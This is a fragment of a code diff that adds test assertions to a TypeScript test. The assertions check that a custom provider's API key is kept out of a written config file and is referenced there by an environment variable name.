+        expect(raw).not.toContain("sk-secret-custom-key");
+        const config = JSON.parse(raw) as {
+          providers: { "akmatori-custom": { apiKey: string } };
+        };
+        expect(config.providers["akmatori-custom"].apiKey).toBe("AKMATORI_CUSTOM_PROVIDER_API_KEY");
+        // The env var carries the live secret so the child resolves it.
+        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBe("sk-secret-custom-key");
+      });
     });
   });
 
